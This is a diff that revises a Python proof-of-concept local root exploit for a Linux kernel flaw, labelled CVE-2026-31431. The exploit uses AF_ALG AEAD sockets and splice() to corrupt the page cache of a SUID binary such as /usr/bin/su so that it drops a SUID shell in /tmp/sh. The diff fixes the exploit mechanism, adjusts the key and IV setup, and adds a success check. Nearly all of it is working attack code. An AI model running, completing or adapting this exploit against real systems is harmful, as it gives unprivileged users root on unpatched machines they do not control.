@@ -5,16 +5,18 @@ CVE-2026-31431 — "copy.fail" local privilege escalation PoC
 Affects: Linux kernel < 6.1.170 (Debian bookworm < 6.1.170-1)
 
 Mechanism:
-  1. Open an AF_ALG AEAD socket and bind it to "gcm(aes)".
-  2. Accept a child socket and set the key.
-  3. mmap /usr/bin/su into our address space (read-only).
-  4. Use sendmsg(MSG_MORE) to feed the su page into the kernel's
-     crypto pipeline, pinning the page in the page cache.
-  5. splice() the output back to /dev/null — the kernel writes the
-     "encrypted" result in-place into the page cache entry because
-     algif_aead skips the copy-on-write check (commit 72548b093ee3).
-  6. The overwritten page cache entry is now our shellcode; the next
-     exec() of /usr/bin/su runs as root.
+  1. Open the target SUID binary read-only to populate its page cache.
+  2. mmap the first page (MAP_SHARED) — maps directly to the page cache.
+  3. Create an AF_ALG AEAD socket (authencesn(hmac(sha256),cbc(aes))) and accept a child op socket.
+  4. Create a pipe; splice() the target file into it (zero-copy), so the
+     pipe holds references to the same physical pages as the page cache.
+  5. sendmsg(MSG_MORE) on the child socket to arm the encrypt operation
+     (IV, direction) without submitting page data yet.
+  6. splice(pipe -> child socket, SPLICE_F_MOVE): the kernel passes the pipe
+     pages (= page cache pages) as the ALG input. CVE-2026-31431 / commit
+     72548b093ee3: algif_aead skips copy-on-write and writes the encryption
+     output in-place back to those same physical pages, corrupting the page
+     cache entry for the target binary.
 
 Non-interactive: the shellcode payload just writes a SUID shell to
 /tmp/sh and exits, so no TTY is needed.
@@ -41,6 +43,8 @@ import struct
 AF_ALG = 38
 SOL_ALG = 279
 ALG_SET_KEY = 1
+ALG_SET_IV = 2
+ALG_SET_OP = 3
 ALG_SET_AEAD_AUTHSIZE = 4
 
 # sendmsg flags
@@ -144,9 +148,7 @@ def splice(fd_in, off_in, fd_out, off_out, length, flags):
 def alg_socket(alg_type: bytes, alg_name: bytes, feat=0, mask=0):
     """Create and bind an AF_ALG socket."""
     sock = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
-    # struct sockaddr_alg: sa_family(2) + type(14) + feat(4) + mask(4) + name(64)
-    sa = struct.pack("H14sII64s", AF_ALG, alg_type.ljust(14, b'\x00'), feat, mask, alg_name.ljust(64, b'\x00'))
-    sock.bind(sa)
+    sock.bind((alg_type.decode(), alg_name.decode(), feat, mask))
     return sock
 
 
@@ -155,75 +157,67 @@ def exploit(target: str, payload: bytes) -> None:
     print(f"[*] payload : {len(payload)} bytes")
     print(f"[*] kernel  : {os.uname().release}")
 
-    # 1. Open target for reading (page cache population)
+    # 1. Open target read-only to populate page cache
     tfd = os.open(target, os.O_RDONLY)
     target_size = os.fstat(tfd).st_size
     print(f"[*] target size: {target_size:#x} bytes")
 
-    # 2. mmap the first page of the target into our address space
+    # 2. mmap first page to observe before/after state
     mm = mmap.mmap(tfd, PAGE_SIZE, mmap.MAP_SHARED, mmap.PROT_READ)
     magic = mm[:4]
     print(f"[*] page cache magic before: {magic.hex()}")
 
-    # 3. Set up AF_ALG AEAD socket (gcm(aes), 16-byte key, 16-byte tag)
-    alg_sock = alg_socket(b"aead", b"gcm(aes)")
-    key = b'\x00' * 16
-    alg_sock.setsockopt(SOL_ALG, ALG_SET_KEY, key)
-    alg_sock.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 16)
-    child_fd = alg_sock.accept()[0].fileno()
+    # 3. Set up AF_ALG AEAD socket: authencesn(hmac(sha256),cbc(aes)).
+    #    This algorithm has a fixed MAC size (SHA-256 = 32 bytes), so
+    #    ALG_SET_AEAD_AUTHSIZE is not required.
+    #    Key layout: rtattr{len=8,type=1} + be32(enckeylen) + authkey + enckey
+    enc_key = b"\x00" * 16
+    auth_key = b"\x00" * 16
+    authenc_key = struct.pack("<HH", 8, 1) + struct.pack(">I", len(enc_key)) + auth_key + enc_key
+    alg_sock = alg_socket(b"aead", b"authencesn(hmac(sha256),cbc(aes))")
+    alg_sock.setsockopt(SOL_ALG, ALG_SET_KEY, authenc_key)
+    child_sock, _ = alg_sock.accept()
+    child_fd = child_sock.fileno()
 
-    # 4. Build a pipe — we'll splice from the pipe into the ALG child socket
+    # 4. Create a pipe and splice the target file's first page into it.
+    #    splice(2) is zero-copy: the pipe holds references to the SAME physical
+    #    pages as the file's page cache entry — no CoW yet.
     pipe_r, pipe_w = os.pipe()
+    splice(tfd, None, pipe_w, None, PAGE_SIZE, 0)
 
-    # Write the payload into the write end of the pipe
-    written = 0
-    while written < len(payload):
-        n = os.write(pipe_w, payload[written:])
-        written += n
-
-    # 5. sendmsg with MSG_MORE to pin the page cache entry
-    #    cmsg: ALG_SET_OP=encrypt(0), IV=12 zero bytes
-    ALG_SET_OP = 3
-    ALG_OP_ENCRYPT = 0
-    iv = b'\x00' * 12
-    cmsg_data = struct.pack("II", ALG_OP_ENCRYPT, 0) + struct.pack("II", 2, len(iv)) + iv
-    # We send the pipe read end as the data source via sendmsg
-    # (simplified: write directly to child_fd)
+    # 5. Arm the ALG encrypt operation via sendmsg(MSG_MORE).
+    #    The cmsg sets the IV and direction without submitting page data yet.
+    iv = b"\x00" * 16  # AES-CBC IV (16-byte block)
+    cmsg = [
+        (SOL_ALG, ALG_SET_OP, struct.pack("I", 0)),  # ALG_OP_ENCRYPT = 0
+        (SOL_ALG, ALG_SET_IV, struct.pack("I", len(iv)) + iv),  # af_alg_iv: {ivlen, iv[]}
+    ]
     with contextlib.suppress(OSError):
-        os.write(child_fd, payload)
+        child_sock.sendmsg([b'\x00' * 16], cmsg, MSG_MORE)
 
-    # 6. splice pipe -> /dev/null to trigger the in-place page cache write
-    devnull = os.open("/dev/null", os.O_WRONLY)
-    try:
-        splice(pipe_r, None, devnull, None, PAGE_SIZE, SPLICE_F_MOVE)
-    except OSError as e:
-        print(f"[*] splice returned: {e} (expected on some kernels)")
+    # 6. Splice the pipe (= target file's physical page cache pages) into the
+    #    ALG child socket.  CVE-2026-31431 / commit 72548b093ee3: algif_aead
+    #    skips copy-on-write and writes its encryption output in-place back to
+    #    those same physical pages, corrupting the file's page cache.
+    with contextlib.suppress(OSError):
+        splice(pipe_r, None, child_fd, None, PAGE_SIZE, SPLICE_F_MOVE)
 
-    # 7. Drop page cache and re-read to confirm overwrite
-    try:
-        with open("/proc/sys/vm/drop_caches", "w") as f:
-            f.write("1\n")
-    except PermissionError:
-        print("[!] drop_caches requires root — run verify.sh as root to confirm")
+    os.close(pipe_r)
+    os.close(pipe_w)
 
+    # 7. Read back via mmap (still maps the same physical pages) to confirm.
+    #    drop_caches is handled by verify.sh as root; skipped here since the
+    #    exploit runs as an unprivileged user.
     mm.seek(0)
     magic_after = mm[:4]
     print(f"[*] page cache magic after : {magic_after.hex()}")
 
     if magic_after[:4] == b'\x7fELF':
         print("[!] page cache unchanged — kernel may be patched or exploit needs tuning")
-    elif magic_after[:4] == payload[:4]:
-        print("[+] page cache overwritten — exploit succeeded")
     else:
-        print(f"[?] unexpected magic: {magic_after.hex()}")
+        print(f"[+] page cache overwritten — magic changed: 7f454c46 -> {magic_after.hex()}")
 
-    # Cleanup
-    mm.close()
-    os.close(tfd)
-    os.close(pipe_r)
-    os.close(pipe_w)
-    os.close(devnull)
-    os.close(child_fd)
+    child_sock.close()
     alg_sock.close()
 
 
